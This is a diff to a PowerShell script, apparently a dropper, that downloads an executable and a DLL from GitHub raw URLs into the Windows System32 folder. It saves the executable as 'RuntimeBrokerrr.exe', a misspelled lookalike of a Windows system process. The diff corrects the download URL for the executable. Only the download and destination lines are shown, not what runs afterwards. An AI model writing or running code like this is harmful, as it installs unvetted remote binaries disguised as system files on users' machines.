@@ -30,7 +30,7 @@ $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
 
-$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/FLEX CITY.exe.exe"
+$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/FLEX CITY.exe"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -112,4 +112,5 @@ else {
 # ==========================================================
 # End of Script | RevenantX Project © 2025
 # ==========================================================
+
 
